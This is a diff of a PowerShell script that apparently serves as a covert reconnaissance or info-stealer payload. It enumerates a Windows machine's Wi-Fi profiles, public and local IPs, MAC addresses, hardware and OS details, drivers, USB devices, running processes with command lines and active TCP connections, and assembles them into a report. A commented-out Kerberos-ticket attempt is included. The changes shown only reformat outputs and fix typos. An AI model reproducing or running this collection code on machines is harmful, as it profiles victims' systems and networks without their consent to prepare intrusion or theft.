@@ -129,13 +129,13 @@ $PromptOnSecureDesktop_Name = "PromptOnSecureDesktop"
 $ConsentPromptBehaviorAdmin_Value = Get-RegistryValue $Key $ConsentPromptBehaviorAdmin_Name 
 $PromptOnSecureDesktop_Value = Get-RegistryValue $Key $PromptOnSecureDesktop_Name
 
-If($ConsentPromptBehaviorAdmin_Value -Eq 0 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Never notIfy" }
+If($ConsentPromptBehaviorAdmin_Value -Eq 0 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Never notify" }
  
-ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "NotIfy me only when apps try to make changes to my computer(do not dim my desktop)" } 
+ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Notify me only when apps try to make changes to my computer(do not dim my desktop)" } 
 
-ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "NotIfy me only when apps try to make changes to my computer(default)" }
+ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Notify me only when apps try to make changes to my computer(default)" }
  
-ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 2 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Always notIfy" }
+ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 2 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Always notify" }
  
 Else{ $UAC = "Unknown" }
 
@@ -202,27 +202,27 @@ $WifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$
 $PubAddr = Invoke-WebRequest ipinfo.io/ip -UseBasicParsing
 
 #Local IP interface(s) info
-$LocalAddr =  get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
+$LocalAddr =  get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} | Out-String
 
 #MAC add
-$MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC
+$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Status | Out-String
 
 #System info
-$SysInfo = Get-CimInstance CIM_ComputerSystem
+$SysInfo = Get-CimInstance CIM_ComputerSystem | Out-String
 
 #BIOS info
-$BIOS = Get-CimInstance CIM_BIOSElement
+$BIOS = Get-CimInstance CIM_BIOSElement | Out-String
 
 ##OS Info (referenced I-Am-Jakoby)
-$OSInfo = Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List
+$OSInfo = Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Out-String
 
 #CPU Info
-$CPU = Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
+$CPU = Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Out-String
 
 #GPU Info
 function GPU {
 
-$GPU = Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution
+$GPU = Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution | Out-String
 
     if ($GPU -ne $null) {
 
@@ -238,7 +238,7 @@ $GPU = Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, 
 $GPU = GPU
 
 #Mobo Info
-$MOBO = Get-WmiObject Win32_BaseBoard | Format-List
+$MOBO = Get-WmiObject Win32_BaseBoard | Out-String
 
 #RAM Capacity
 function RamCap {
@@ -263,7 +263,7 @@ $driveType = @{
 $StorageDrives = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } | Out-String
 
 #All drivers
-$Drivers = Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
+$Drivers = Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion | Out-String
 
 ######################################################################################################################################################################
 
@@ -271,7 +271,7 @@ $Drivers = Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $
 
 #COM/ serical devices
 #Referenced I-Am-Jakoby
-$COMDev = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
+$COMDev = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table | Out-String
 
 #Kerberos tickets = klist session? Not working..
 <#
@@ -293,12 +293,12 @@ $ALLWLAN = netsh.exe wlan show profiles | Select-String -pattern " : "
 ######################################################################################################################################################################
 
 #Running Processes
-$RunningProc = Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine | Sort-Object ProcessName
+$RunningProc = Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine | Sort-Object ProcessName |Format-Table Handle, ProcessName, ExecutablePath, CommandLine | Out-String
 
 ######################################################################################################################################################################
 
 #Active TCP Connections
-$ActiveTCP = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess | Format-Table -AutoSize
+$ActiveTCP = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess | Format-Table -AutoSize | Out-String
 
 ######################################################################################################################################################################
 
@@ -358,7 +358,7 @@ Network Interfaces:
 $NetInt
 
 All WLAN profile names:
-$ALLWAN
+$ALLWLAN
 
 ------------------------------------------------------------------------------------------------------------------------------
 
